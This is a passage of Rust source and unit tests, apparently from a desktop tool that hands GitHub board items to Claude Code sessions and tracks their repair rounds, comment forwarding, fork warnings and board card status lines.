        cx: &mut Context<Self>,
    ) {
        let Some(file) = read_reply(path) else {
            return;
        };
        let remind = match self.session_at(path, cx) {
            SessionAt::Done(remind) => remind,
            SessionAt::Working | SessionAt::Held(_) => Remind::Nothing,
        };
        self.remind_reply(record, path, file.stamp, remind, problems, cx);
    }

    fn note_forward(
        &mut self,
        record: &WorktreeDispatch,
        path: &Path,
        note: Option<ForwardNote>,
        cx: &mut Context<Self>,
    ) {
        let tab_title = self.tab_title_at(path);
        let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) else {
            return;
        };
        if watch.forward_note != note {
            watch.forward_note = note.clone();
            cx.notify();
        }
        let Some(ForwardNote::Stopped(names)) = note else {
            return;
        };
        let handed_at = record.forwarded.as_ref().map(|last| last.at.clone());
        if handed_at.is_none() || watch.forward_rang == handed_at {
            return;
        }
        watch.forward_rang = handed_at;
        let detail = format!(
            "Its session stopped without a push or a reply after {} commented.",
            named(&names)
        );
        self.push_notification(
            NotificationKind::SessionWaiting,
            format!("#{} waits for you", record.number),
            detail,
            tab_title,
            cx,
        );
    }

    fn run_repair(
        &mut self,
        place: (&str, &Path, &str),
        record: &WorktreeDispatch,
        working: &mut Option<bool>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let (project_id, path, branch) = place;
        let Some((pr, step)) = self.next_repair(record, path, working, cx) else {
            self.note_repair(record, path, None, cx);
            return;
        };
        let note = match step {
            RepairStep::Nothing => None,
            RepairStep::Clear => {
                let healthy = WorktreeDispatch {
                    repair: None,
                    ..record.clone()
                };
                if let Err(err) = self.save_record(project_id, path, branch, healthy, cx) {
                    let number = record.number;
                    eprintln!("warning: couldn't forget the repairs of #{number}: {err}");
                }
                None
            }
            RepairStep::Running => {
                record.repair.as_ref().map(|r| RepairNote::Running(r.fault, r.attempts))
            }
            RepairStep::StoppedWithoutPush => {
                record.repair.as_ref().map(|r| RepairNote::Stopped(r.fault))
            }
            RepairStep::GaveUp(fault) => Some(RepairNote::GaveUp(fault.kind())),
            RepairStep::Start { fault, attempt } => {
                self.start_repair(place, record, &pr, (fault, attempt), window, cx)
            }
        };
        self.note_repair(record, path, note, cx);
    }

    fn next_repair(
        &mut self,
        record: &WorktreeDispatch,
        path: &Path,
        working: &mut Option<bool>,
        cx: &App,
    ) -> Option<(PullRequest, RepairStep)> {
        let watch = self.board.dispatch.watches.get(&record.item_id)?;
        let reported = record.pull_request.is_some() || watch.reported.is_some();
        let pr = watch.pull_request.clone().filter(|_| reported)?;
        let repair = record.repair.as_ref();
        if repair.is_none() && fault(&pr).is_none() {
            return Some((pr, RepairStep::Nothing));
        }
        let role = self.item_role(&record.board_url, &record.item_id);
        let working = self.is_working(path, cx, working);
        let forward_open = record.forwarded.as_ref().is_some_and(|last| last.is_open(&pr));
        let watch = self.board.dispatch.watches.get_mut(&record.item_id)?;
        let forward_holds = forward_open || watch.forward_note == Some(ForwardNote::FixReply);
        let turns = watch.turns;
        watch.repair_follow.look(repair.map(|r| r.started_at.clone()), working, turns);
        let active = repair.is_some_and(|r| r.head == pr.head_oid);
        let session = if forward_holds {
            HandoverSession::Busy
        } else {
            watch.repair_follow.session(working, active, watch.read_ok_at)
        };
        let step = match repair_step(&pr, repair, session, role) {
            RepairStep::Clear => {
                let read = watch.read_ok_at?;
                let first = match &watch.healthy_since {
                    Some((head, at)) if *head == pr.head_oid => *at,
                    _ => read,
                };
                watch.healthy_since = Some((pr.head_oid.clone(), first));
                if read.duration_since(first) >= HEALTHY_BEFORE_REPAIRS_RESET {
                    RepairStep::Clear
                } else {
                    RepairStep::Nothing
                }
            }
            RepairStep::Start { .. } if !watch.read_after_stop() => {
                watch.healthy_since = None;
                RepairStep::Nothing
            }
            step => {
                watch.healthy_since = None;
                step
            }
        };
        Some((pr, step))
    }

    fn start_repair(
        &mut self,
        place: (&str, &Path, &str),
        record: &WorktreeDispatch,
        pr: &PullRequest,
        (fault, attempt): (Fault, u32),
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Option<RepairNote> {
        let (project_id, path, branch) = place;
        let waits = Some(RepairNote::Waits(fault.kind()));
        let watch = self.board.dispatch.watches.get(&record.item_id);
        let failed_at = watch.and_then(|watch| watch.repair_failed_at);
        if failed_at.is_some_and(|at| at.elapsed() < POST_RETRY) {
            return waits;
        }
        let message = repair_message(record.number);
        let Some(route) = self.handover_route(place, &message, cx) else {
            return waits;
        };
        let skill = skill_in(path, "repair");
        let task = repair_task(record, pr, &fault, skill.as_deref());
        let started_at = codescope_core::time::now_iso8601();
        let repaired = WorktreeDispatch {
            repair: Some(Repair {
                attempts: attempt,
                fault: fault.kind(),
                started_at: started_at.clone(),
                head: pr.head_oid.clone(),
            }),
            ..record.clone()
        };
        let saved = write_task_file(path, &task)
            .map_err(|err| format!("{err:#}"))
            .and_then(|()| self.save_record(project_id, path, branch, repaired, cx));
        if let Err(message) = saved {
            if let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) {
                watch.repair_failed_at = Some(Instant::now());
            }
            let title = format!("Couldn't start the repair of #{}", record.number);
            self.push_toast(ToastKind::Err, title, Some(message.into()), cx);
            return waits;
        }
        if let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) {
            let turns = watch.turns;
            watch.repair_follow.start(started_at, turns);
        }
        self.deliver(path, route, message, window, cx);
        let title = format!("Repair started on #{}", record.number);
        self.push_toast(ToastKind::Ok, title, Some(fault.kind().label().into()), cx);
        Some(RepairNote::Running(fault.kind(), attempt))
    }

    fn note_repair(
        &mut self,
        record: &WorktreeDispatch,
        path: &Path,
        note: Option<RepairNote>,
        cx: &mut Context<Self>,
    ) {
        let tab_title = self.tab_title_at(path);
        let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) else {
            return;
        };
        if watch.repair_note != note {
            watch.repair_note = note;
            cx.notify();
        }
        let Some(note) = note else {
            return;
        };
        let rang_for = (record.repair.as_ref().map(|r| r.started_at.clone()), note);
        if watch.repair_rang.as_ref() == Some(&rang_for) {
            return;
        }
        let Some(detail) = repair_bell(note) else {
            return;
        };
        watch.repair_rang = Some(rang_for);
        self.push_notification(
            NotificationKind::SessionWaiting,
            format!("#{} waits for you", record.number),
            detail,
            tab_title,
            cx,
        );
    }

    /// What each card on the board at `board_url` says about dispatch, by item id.
    pub(crate) fn card_notes(&self, board_url: &str, cx: &App) -> HashMap<String, CardNote> {
        let state = &self.board.dispatch;
        let viewer = state.viewer.as_ref().map(|v| v.login.as_str());
        let records: Vec<_> = self
            .dispatch_records(cx)
            .into_iter()
            .filter(|(_, _, _, r)| r.board_url == board_url)
            .collect();
        let rounds: HashSet<RoundKey> = records.iter().map(|(_, _, _, r)| round_key(r)).collect();
        let mut notes: HashMap<String, CardNote> = records
            .into_iter()
            .map(|(_, _, branch, r)| {
                let posted = r.findings.as_ref().filter(|_| r.round == Round::Research);
                let note = match (posted.map(|p| p.outcome), branch) {
                    (Some(Outcome::DecisionPoints), _) => decision_note(
                        state.discussions.get(&r.content_id),
                        viewer,
                        state.readied.contains(&r.item_id),
                        r.kind,
                    ),
                    (Some(Outcome::Findings), _) => {
                        CardNote::new("Findings posted · move it to Ready", NoteTone::NeedsYou)
                    }
                    (None, Some(branch)) => CardNote::new(
                        format!("{} · {branch}", r.round.label()),
                        NoteTone::Working,
                    ),
                    (None, None) => CardNote::new(r.round.label(), NoteTone::Working),
                };
                let watched = state.watches.get(&r.item_id).and_then(|watch| {
                    let posted = r.pull_request.as_ref().or(watch.reported.as_ref());
                    match r.round {
                        Round::Research => None,
                        Round::Implementation => pull_request_note(watch, posted, r.kind),
                        Round::Review => {
                            review_note(watch, &review_round(&r, watch), posted, r.kind)
                        }
                    }
                });
                let handover = state.watches.get(&r.item_id).and_then(handover_card);
                let cleanup = self.cleanup_card(&r);
                (r.item_id, cleanup.or(handover).or(watched).unwrap_or(note))
            })
            .collect();
        for key in state.posting.iter().filter(|key| rounds.contains(*key)) {
            notes.insert(key.0.clone(), CardNote::new("Posting the findings…", NoteTone::Working));
        }
        for (key, reminder) in state.reminders.iter().filter(|(key, _)| rounds.contains(*key)) {
            let text = format!("Findings incomplete: {}", reminder.problems);
            notes.insert(key.0.clone(), CardNote::new(text, NoteTone::Failed));
        }
        for (key, (_, note)) in state.post_errors.iter().filter(|(key, _)| rounds.contains(*key)) {
            notes.insert(key.0.clone(), CardNote::new(note.clone(), NoteTone::Failed));
        }
        for (key, by) in state.findings_held.iter().filter(|(key, _)| rounds.contains(*key)) {
            notes.insert(key.0.clone(), held_note("Findings written", "post them", *by));
        }
        for (item_id, hold) in &state.holds {
            if !hold.is_quiet() {
                notes.insert(item_id.clone(), hold_note(hold));
            }
        }
        for (item_id, (_, message)) in &state.failed {
            let text = format!("Couldn't start: {message}");
            notes.insert(item_id.clone(), CardNote::new(text, NoteTone::Failed));
        }
        for (item_id, round) in &state.starting {
            let round = round.label().to_lowercase();
            let text = if state.setting_up.contains(item_id) {
                format!("Setting up its worktree for {round}…")
            } else {
                format!("Starting {round}…")
            };
            notes.insert(item_id.clone(), CardNote::new(text, NoteTone::Working));
        }
        notes
    }

    /// What the Decide dialog asks about `item_id`, while its decision points are known.
    pub(crate) fn decision(&self, item_id: &str, cx: &App) -> Option<Decision> {
        let (_, _, _, record) = self
            .dispatch_records(cx)
            .into_iter()
            .find(|(_, _, _, r)| r.item_id == item_id && r.round == Round::Research)?;
        let posted = record.findings.clone()?;
        let discussion = self.board.dispatch.discussions.get(&record.content_id)?;
        if posted.outcome != Outcome::DecisionPoints || discussion.points.is_empty() {
            return None;
        }
        let answered = chosen(&discussion.answers);
        let choices = discussion
            .points
            .iter()
            .map(|point| {
                answered
                    .iter()
                    .find(|(id, _)| *id == point.id)
                    .map_or(point.advice, |(_, letter)| *letter)
            })
            .collect();
        Some(Decision {
            item_id: record.item_id,
            board_url: record.board_url,
            content_id: record.content_id,
            kind: record.kind,
            number: record.number,
            repository: record.repository,
            title: record.title,
            findings_url: posted.comment_url,
            points: discussion.points.clone(),
            choices,
        })
    }

    /// Post the answer where the findings are, then move the item to Ready when asked and it is
    /// still in Needs decision, where CodeScope put it.
    pub(crate) fn send_answer(&mut self, post: AnswerPost, cx: &mut Context<Self>) {
        let ready = if post.move_to_ready {
            self.ready_target(&post.board_url, &post.item_id)
        } else {
            None
        };
        let stayed = post.move_to_ready && ready.is_none();
        let body = answer_body(&post.choices, &post.note);
        let content_id = post.content_id.clone();
        let item_id = post.item_id.clone();
        let posted_body = body.clone();
        cx.spawn(async move |this, cx| {
            let result = cx
                .background_spawn(async move {
                    let url = github::add_comment(&content_id, &posted_body)
                        .map_err(|err| format!("{err:#}"))?
                        .url;
                    let moved = ready.and_then(|(board, column)| {
                        github::set_status(&board, &item_id, &column)
                            .map_err(|err| format!("{err:#}"))
                            .err()
                    });
                    Ok::<_, String>((url, moved))
                })
                .await;
            let _ = this.update(cx, |this, cx| {
                this.finish_answer(post, body, stayed, result, cx);
            });
        })
        .detach();
    }

    /// The board and Ready column to move `item_id` to, while it is in Needs decision.
    fn ready_target(&self, board_url: &str, item_id: &str) -> Option<(Board, String)> {
        if self.item_role(board_url, item_id) != Some(ColumnRole::NeedsDecision) {
            return None;
        }
        self.column_target(board_url, ColumnRole::Ready)
    }

    fn finish_answer(
        &mut self,
        post: AnswerPost,
        body: String,
        stayed: bool,
        result: Result<(String, Option<String>), String>,
        cx: &mut Context<Self>,
    ) {
        let (url, move_error) = match result {
            Ok(done) => done,
            Err(message) => {
                if let Some(dialog) = self.decide_dialog.as_mut() {
                    dialog.sending = false;
                    dialog.error = Some(format!("Couldn't post the answer: {message}"));
                }
                cx.notify();
                return;
            }
        };
        self.decide_dialog = None;
        let state = &mut self.board.dispatch;
        if let (Some(viewer), Some(discussion)) =
            (&state.viewer, state.discussions.get_mut(&post.content_id))
        {
            discussion.answers.push(Answer {
                author: viewer.login.clone(),
                created_at: codescope_core::time::now_iso8601(),
                url,
                choices: post.choices.clone(),
                body,
            });
        }
        let moved = post.move_to_ready && !stayed && move_error.is_none();
        if moved {
            state.readied.insert(post.item_id.clone());
        }
        let title = format!("Answer posted on #{}", post.number);
        let work = work_after_research(post.kind);
        let (kind, detail) = match (&move_error, stayed, post.move_to_ready) {
            (Some(err), _, _) => (ToastKind::Err, format!("Couldn't move it to Ready: {err}")),
            (None, true, _) => (
                ToastKind::Info,
                "It isn't in Needs decision anymore, so it stays where it is.".to_string(),
            ),
            (None, false, true) => (
                ToastKind::Ok,
                format!("It moved to Ready; {work} starts at the next board read."),
            ),
            (None, false, false) => (ToastKind::Ok, format!("Move it to Ready to start {work}.")),
        };
        self.push_toast(kind, title, Some(detail.into()), cx);
        if moved {
            self.refresh_boards(cx);
        }
        cx.notify();
    }
}

fn findings_next_step(outcome: Outcome, kind: ItemKind) -> String {
    match (outcome, kind) {
        (Outcome::DecisionPoints, _) => {
            format!("Answer the decision points on the {}.", kind.noun())
        }
        (Outcome::Findings, ItemKind::PullRequest) => {
            "Move the item to Ready for a review round.".to_string()
        }
        (Outcome::Findings, ItemKind::Issue | ItemKind::Draft) => {
            "Move the item to Ready to implement it.".to_string()
        }
    }
}

/// What Ready starts after research on an item of `kind`, as a sentence names it.
pub(crate) fn work_after_research(kind: ItemKind) -> &'static str {
    match kind {
        ItemKind::PullRequest => "a review",
        ItemKind::Issue | ItemKind::Draft => "implementation",
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RepairNote {
    Running(FaultKind, u32),
    Waits(FaultKind),
    Stopped(FaultKind),
    GaveUp(FaultKind),
}

fn repair_card(note: RepairNote) -> CardNote {
    match note {
        RepairNote::Running(kind, attempt) => {
            let doing = match kind {
                FaultKind::Checks => "Repairing failed checks",
                FaultKind::Conflict => "Resolving a conflict with its base",
                FaultKind::Behind => "Catching up with its base",
            };
            let text = format!("{doing} · {attempt} of {REPAIR_ATTEMPTS}");
            CardNote::new(text, NoteTone::Working)
        }
        RepairNote::Waits(kind) => {
            let text = format!("{} · the repair waits for its session", kind.label());
            CardNote::new(text, NoteTone::Waiting)
        }
        RepairNote::Stopped(_) => CardNote::new(
            "The repair stopped without a push · see its session",
            NoteTone::NeedsYou,
        ),
        RepairNote::GaveUp(kind) => {
            let text = format!("{} after {REPAIR_ATTEMPTS} repairs · it needs you", kind.label());
            CardNote::new(text, NoteTone::NeedsYou)
        }
    }
}

fn repair_bell(note: RepairNote) -> Option<String> {
    match note {
        RepairNote::Stopped(_) => Some("The repair stopped without a push.".into()),
        RepairNote::GaveUp(kind) => {
            Some(format!("{} after {REPAIR_ATTEMPTS} repairs.", kind.label()))
        }
        RepairNote::Running(..) | RepairNote::Waits(_) => None,
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum ForwardNote {
    Waits(Vec<String>),
    Working(Vec<String>),
    Posting,
    FixReply,
    Stopped(Vec<String>),
}

fn named(authors: &[String]) -> String {
    let named: Vec<String> = authors.iter().map(|author| format!("@{author}")).collect();
    match named.as_slice() {
        [rest @ .., last] if !rest.is_empty() => format!("{} and {last}", rest.join(", ")),
        _ => named.concat(),
    }
}

fn forward_card(watch: &PullRequestWatch) -> Option<CardNote> {
    let commented =
        |authors: &[String], how: &str| format!("{} commented · {how}", named(authors));
    let card = match watch.forward_note.as_ref()? {
        ForwardNote::Waits(authors) => {
            CardNote::new(commented(authors, "waits for its session"), NoteTone::Waiting)
        }
        ForwardNote::Working(authors) => {
            CardNote::new(commented(authors, "handed to its session"), NoteTone::Working)
        }
        ForwardNote::Posting => match &watch.forward_post_error {
            Some((_, message)) => {
                CardNote::new(format!("Couldn't post the reply: {message}"), NoteTone::Failed)
            }
            None => CardNote::new("Posting the reply…", NoteTone::Working),
        },
        ForwardNote::FixReply => {
            let problems = watch.reply_reminder.as_ref().map_or("", |r| r.problems.as_str());
            CardNote::new(format!("Reply incomplete: {problems}"), NoteTone::Failed)
        }
        ForwardNote::Stopped(authors) => CardNote::new(
            commented(authors, "its session stopped without a push or a reply"),
            NoteTone::NeedsYou,
        ),
    };
    Some(card)
}

fn handover_card(watch: &PullRequestWatch) -> Option<CardNote> {
    let forward = forward_card(watch);
    let repair = watch.repair_note.map(repair_card);
    if matches!(watch.forward_note, Some(ForwardNote::Waits(_))) {
        repair.or(forward)
    } else {
        forward.or(repair)
    }
}

/// The card line of an item that waits.
fn hold_note(hold: &Hold) -> CardNote {
    match hold {
        Hold::FromFork => CardNote {
            action: Some(CardAction::StartFromFork),
            ..CardNote::new(hold.label(), NoteTone::NeedsYou)
        },
        _ => CardNote::new(hold.label(), NoteTone::Waiting),
    }
}

/// The title, warning and push line of the dialog that starts fork pull request `number`.
fn fork_warning(number: u32, head: &PullRequestHead) -> (String, String, String) {
    let from = match &head.repository {
        Some(repository) => format!("Its branch comes from {repository}."),
        None => "Its branch comes from a fork that is gone.".to_string(),
    };
    let message = format!(
        "{from} The agent works in a checkout of it, so the CLAUDE.md, skills and settings on \
         that branch steer it and can run commands on this computer. Look at what the pull \
         request changes in them first."
    );
    let reply_only = "so the round can only reply.";
    let detail = match &head.repository {
        None => format!("Its fork is gone, {reply_only}"),
        Some(_) if !head.maintainer_can_modify => {
            format!("Its author doesn't allow edits by maintainers, {reply_only}")
        }
        Some(_) if !is_plain_branch(&head.branch) => format!(
            "Its branch name has characters CodeScope doesn't put in a command, {reply_only}"
        ),
        Some(repository) => format!(
            "Its author allows edits by maintainers, so the agent can push to {} in \
             {repository}.",
            head.branch
        ),
    };
    (format!("Start #{number} from a fork?"), message, detail)
}

/// The card line of research that posted decision points: what to decide, or who answered.
fn decision_note(
    discussion: Option<&Discussion>,
    viewer: Option<&str>,
    readied: bool,
    kind: ItemKind,
) -> CardNote {
    let unanswered = || {
        let text = format!("Decision points posted · answer on the {}", kind.noun());
        CardNote::new(text, NoteTone::NeedsYou)
    };
    let Some(discussion) = discussion else {
        return unanswered();
    };
    let Some(last) = discussion.answers.last() else {
        let count = discussion.points.len();
        if count == 0 {
            return unanswered();
        }
        let points = if count == 1 { "decision point" } else { "decision points" };
        return CardNote {
            text: format!("{count} {points} · decide here or on the {}", kind.noun()).into(),
            tone: NoteTone::NeedsYou,
            action: Some(CardAction::Decide),
        };
    };
    let who = if viewer.is_some_and(|v| v.eq_ignore_ascii_case(&last.author)) {
        "you".to_string()
    } else {
        format!("@{}", last.author)
    };
    let picked = chosen(&discussion.answers);
    let answered = if picked.is_empty() {
        format!("Answered by {who}")
    } else {
        format!("Answered by {who}: {}", choices_text(&picked))
    };
    if readied {
        let work = work_after_research(kind);
        CardNote::new(format!("{answered} · {work} starts"), NoteTone::Working)
    } else {
        CardNote::new(format!("{answered} · move it to Ready"), NoteTone::NeedsYou)
    }
}

fn held_note(done: &str, to: &str, by: HeldBy) -> CardNote {
    let text = match by {
        HeldBy::Program => {
            format!("{done} · to {to}, quit what runs in its worktree's tab, or close the tab")
        }
        HeldBy::QuietAgent => format!(
            "{done} · its agent may not be done: to {to}, quit what runs in its tab, or close \
             the tab"
        ),
        HeldBy::StoppedSession => format!(
            "{done} · to {to}, type fg in its session's tab to resume it, or close the tab"
        ),
    };
    CardNote::new(text, NoteTone::Waiting)
}

fn review_note(
    watch: &PullRequestWatch,
    review: &ReviewRound,
    posted: Option<&PostedPullRequest>,
    kind: ItemKind,
) -> Option<CardNote> {
    if watch.ending_review {
        return Some(CardNote::new("Reporting the review…", NoteTone::Working));
    }
    if let Some(reminder) = &watch.reply_reminder {
        let text = format!("Reply incomplete: {}", reminder.problems);
        return Some(CardNote::new(text, NoteTone::Failed));
    }
    if let Some((_, message)) = &watch.review_end_error {
        let text = format!("Couldn't report the review: {message}");
        return Some(CardNote::new(text, NoteTone::Failed));
    }
    let open = watch.pull_request.as_ref().is_some_and(|pr| pr.state == PullRequestState::Open);
    if review.report_url.is_some() || !open {
        return pull_request_note(watch, posted, kind);
    }
    if let Some(by) = watch.review_held {
        return Some(held_note("Review answered", "report it", by));
    }
    watch.stopped_without_result().then(|| {
        CardNote::new(
            "Review stopped without a push or a reply · waiting for you in the tab",
            NoteTone::NeedsYou,
        )
    })
}

/// The card line of a round's pull request when it or the session has something to say; `None`
/// leaves the round's own line.
fn pull_request_note(
    watch: &PullRequestWatch,
    posted: Option<&PostedPullRequest>,
    kind: ItemKind,
) -> Option<CardNote> {
    if watch.reporting {
        return Some(CardNote::new("Reporting the pull request…", NoteTone::Working));
    }
    if let Some((_, message)) = &watch.report_error {
        let text = format!("Couldn't report the pull request: {message}");
        return Some(CardNote::new(text, NoteTone::Failed));
    }
    if let Some((_, message)) = &watch.move_error {
        let text = format!("Couldn't move it to In review: {message}");
        return Some(CardNote::new(text, NoteTone::Failed));
    }
    let Some(pr) = &watch.pull_request else {
        if watch.waits_for_you() {
            return Some(CardNote::new("Waiting for you in the tab", NoteTone::NeedsYou));
        }
        let unread = watch.read_ok_at.is_none();
        return posted
            .filter(|_| unread)
            .map(|p| CardNote::new(format!("PR #{}", p.number), NoteTone::Waiting));
    };
    let number = pr.number;
    Some(match (pr.state, pr.is_draft) {
        (PullRequestState::Merged, _) => {
            CardNote::new(format!("PR #{number} merged"), NoteTone::Waiting)
        }
        (PullRequestState::Open, true) if watch.marking_ready => CardNote::new(
            format!("Marking PR #{number} ready for review…"),
            NoteTone::Working,
        ),
        (PullRequestState::Open, true) if kind == ItemKind::PullRequest => CardNote {
            text: format!("Draft PR #{number} · moves to In review once marked ready").into(),
            tone: NoteTone::Waiting,
            action: Some(CardAction::ReadyForReview),
        },
        (PullRequestState::Open, true) => CardNote {
            text: format!("Draft PR #{number} · test by hand").into(),
            tone: NoteTone::NeedsYou,
            action: Some(CardAction::ReadyForReview),
        },
        (PullRequestState::Open, false) => {
            let (checks, tone) = match pr.checks {
                Checks::None => ("no checks", NoteTone::Waiting),
                Checks::Running => ("checks running", NoteTone::Waiting),
                Checks::Passing => ("checks passing", NoteTone::Waiting),
                Checks::Failing => ("checks failing", NoteTone::Failed),
            };
            CardNote::new(format!("PR #{number} · {checks}"), tone)
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use codescope_core::board::findings::DecisionOption;

    fn tab(running: Option<&[u32]>, claude_idle: Option<bool>, typed: bool) -> TabAtHandover {
        tab_at_handover(&TabProbe {
            restarting: false,
            launched_lately: false,
            shell_gone: false,
            running,
            claude_idle,
            stopped: false,
            typed,
        })
    }

    #[test]
    fn a_bare_shell_is_no_session_and_only_an_idle_claude_code_gets_the_task_typed() {
        use TabAtHandover::*;
        assert_eq!(tab(Some(&[]), None, false), Shell);
        assert_eq!(tab(Some(&[7]), Some(true), false), IdleClaude);
        assert_eq!(tab(Some(&[7]), Some(true), true), Draft);
        assert_eq!(tab(Some(&[7]), Some(false), false), Busy);
        assert_eq!(tab(Some(&[7]), None, false), Other, "another agent, or any other program");
        assert_eq!(tab(None, None, false), Other, "nothing known about its processes");
        let stopped = TabProbe {
            restarting: false,
            launched_lately: false,
            shell_gone: false,
            running: Some(&[7]),
            claude_idle: Some(true),
            stopped: true,
            typed: true,
        };
        assert_eq!(tab_at_handover(&stopped), Stopped, "Ctrl+Z hands its keys to the shell");
        for claude_idle in [Some(false), None] {
            let other_status = TabProbe {
                claude_idle,
                ..stopped
            };
            assert_eq!(tab_at_handover(&other_status), Stopped, "mid-turn or without a status");
        }
    }

    #[test]
    fn a_tab_a_claude_update_restarts_is_busy_whatever_runs_in_it() {
        for running in [None, Some(&[][..]), Some(&[7][..])] {
            let probe = TabProbe {
                restarting: true,
                launched_lately: false,
                shell_gone: false,
                running,
                claude_idle: running.map(|_| true),
                stopped: false,
                typed: false,
            };
            assert_eq!(tab_at_handover(&probe), TabAtHandover::Busy);
        }
    }

    fn point(id: &str) -> DecisionPoint {
        DecisionPoint {
            id: id.into(),
            question: "Q?".into(),
            context: String::new(),
            options: ['A', 'B']
                .map(|letter| DecisionOption {
                    letter,
                    text: "x".into(),
                })
                .to_vec(),
            advice: 'A',
        }
    }

    fn answer(author: &str, choices: &[(&str, char)]) -> Answer {
        Answer {
            author: author.into(),
            created_at: "t".into(),
            url: "u".into(),
            choices: choices.iter().map(|(id, l)| (id.to_string(), *l)).collect(),
            body: String::new(),
        }
    }

    #[test]
    fn a_write_access_answer_no_read_could_recheck_stops_counting() {
        let at = Instant::now();
        let answer = (true, at);
        assert_eq!(usable_access(Some(&answer), at + ACCESS_RECHECK_AFTER), Some(true));
        assert_eq!(usable_access(Some(&answer), at + ACCESS_EXPIRES_AFTER), None);
        assert_eq!(usable_access(None, at), None);
    }

    #[test]
    fn a_tab_that_launched_lately_is_busy_until_its_program_shows() {
        use TabAtHandover::*;
        let lately = |running: Option<&[u32]>, claude_idle: Option<bool>| {
            tab_at_handover(&TabProbe {
                restarting: false,
                launched_lately: true,
                shell_gone: false,
                running,
                claude_idle,
                stopped: false,
                typed: false,
            })
        };
        assert_eq!(lately(Some(&[]), None), Busy, "its shell hasn't started the agent yet");
        assert_eq!(lately(Some(&[7]), None), Busy, "the agent hasn't written its session yet");
        assert_eq!(lately(None, None), Busy);
        assert_eq!(lately(Some(&[7]), Some(true)), IdleClaude);
    }

    #[test]
    fn a_shell_that_exited_runs_only_its_orphans_and_an_unread_table_tells_nothing() {
        let table = [(1, 0), (10, 1), (11, 10), (12, 11)];
        assert_eq!(running_under(Some(10), &table), Some(vec![11, 12]));
        assert_eq!(running_under(Some(12), &table), Some(vec![]));
        assert_eq!(running_under(Some(40), &table), Some(vec![]), "its shell exited");
        let orphaned = [(1, 0), (41, 40), (42, 41)];
        assert_eq!(running_under(Some(40), &orphaned), Some(vec![41, 42]), "Windows keeps ppid");
        assert_eq!(running_under(None, &table), None);
        assert_eq!(running_under(Some(10), &[]), None);
        assert!(shell_gone(Some(40), &orphaned));
        assert!(!shell_gone(Some(10), &table));
        assert!(!shell_gone(None, &table));
        assert!(!shell_gone(Some(10), &[]), "an unread table tells nothing");
    }

    #[test]
    fn a_tab_whose_shell_is_gone_takes_no_typing() {
        use TabAtHandover::*;
        let gone = |running: Option<&[u32]>, claude_idle: Option<bool>| {
            tab_at_handover(&TabProbe {
                restarting: false,
                launched_lately: false,
                shell_gone: true,
                running,
                claude_idle,
                stopped: false,
                typed: false,
            })
        };
        assert_eq!(gone(Some(&[41]), Some(true)), Other, "its terminal no longer takes input");
        assert_eq!(gone(Some(&[41]), Some(false)), Other);
        assert_eq!(gone(Some(&[]), None), Shell);
    }

    #[test]
    fn a_turn_counts_as_running_only_while_its_transcript_says_so() {
        use codescope_core::SessionState::*;
        assert_eq!(turn_of(Idle, false), Turn::Ended);
        assert_eq!(turn_of(Busy, false), Turn::Running);
        assert_eq!(turn_of(PendingToolUse, false), Turn::Running);
        assert_eq!(turn_of(Unknown, false), Turn::Unknown);
        assert_eq!(turn_of(Idle, true), Turn::Quiet, "a guess at its end, or a killed agent");
    }

    #[test]
    fn findings_wait_for_every_session_on_the_worktree_and_only_claude_code_is_reminded() {
        use FindingsGate::{Held, Settled, Wait};
        use RemindBy::{Notice, Typing};
        use TabAtHandover::*;
        use Turn::{Ended, Quiet, Running, Unknown};
        assert_eq!(findings_gate(&[]), Settled(Notice), "with no session left, the user is told");
        assert_eq!(findings_gate(&[(Shell, Unknown), (IdleClaude, Ended)]), Settled(Typing(1)));
        assert_eq!(
            findings_gate(&[(IdleClaude, Ended), (Busy, Running)]),
            Wait,
            "another session there still works"
        );
        assert_eq!(
            findings_gate(&[(Draft, Ended)]),
            Settled(Notice),
            "the findings can be posted; problems go to the user, not into the tab"
        );
        assert_eq!(
            findings_gate(&[(Stopped, Ended), (IdleClaude, Ended)]),
            Held(HeldBy::StoppedSession),
            "a stopped session may be mid-turn, and only the user can resume it"
        );
        assert_eq!(findings_gate(&[(Draft, Ended), (IdleClaude, Ended)]), Settled(Typing(1)));
        assert_eq!(
            findings_gate(&[(Other, Running), (Shell, Unknown)]),
            Wait,
            "another agent still in its turn"
        );
        assert_eq!(
            findings_gate(&[(Other, Unknown), (Shell, Unknown)]),
            Held(HeldBy::Program),
            "a program that is no agent only the user can stop"
        );
        assert_eq!(
            findings_gate(&[(Other, Quiet), (Shell, Unknown)]),
            Held(HeldBy::QuietAgent),
            "an agent whose transcript went quiet may or may not be done"
        );
        assert_eq!(findings_gate(&[(Other, Unknown), (Busy, Running)]), Wait);
        assert_eq!(
            findings_gate(&[(Other, Ended)]),
            Settled(Notice),
            "another agent whose turn ended is done; the user is told, nothing is typed"
        );
    }

    #[test]
    fn the_task_waits_while_a_session_there_is_busy_or_unknown() {
        use TabAtHandover::*;
        assert_eq!(handover_to(&[]), Handover::NewTab);
        assert_eq!(handover_to(&[Shell, Shell]), Handover::NewTab);
        assert_eq!(handover_to(&[Busy, IdleClaude]), Handover::Type(1));
        assert_eq!(handover_to(&[Shell, Busy]), Handover::Wait(Hold::SessionBusy));
        assert_eq!(handover_to(&[Other, Shell]), Handover::Wait(Hold::OtherProgram));
        assert_eq!(handover_to(&[Other, Busy]), Handover::Wait(Hold::SessionBusy));
        assert_eq!(handover_to(&[Other, Draft]), Handover::Wait(Hold::UnsentInput));
        assert_eq!(handover_to(&[Draft, Busy]), Handover::Wait(Hold::SessionBusy));
        assert_eq!(handover_to(&[Stopped, Shell]), Handover::Wait(Hold::SessionStopped));
        assert_eq!(handover_to(&[Stopped, Draft]), Handover::Wait(Hold::SessionStopped));
        assert_eq!(handover_to(&[Stopped, IdleClaude]), Handover::Type(1));
        assert_eq!(handover_to(&[Stopped, Busy]), Handover::Wait(Hold::SessionBusy));
    }

    #[test]
    fn unanswered_points_offer_the_decide_button() {
        let discussion = Discussion {
            points: vec![point("B1"), point("B2")],
            answers: Vec::new(),
        };
        let note = decision_note(Some(&discussion), Some("maui1911"), false, ItemKind::Issue);
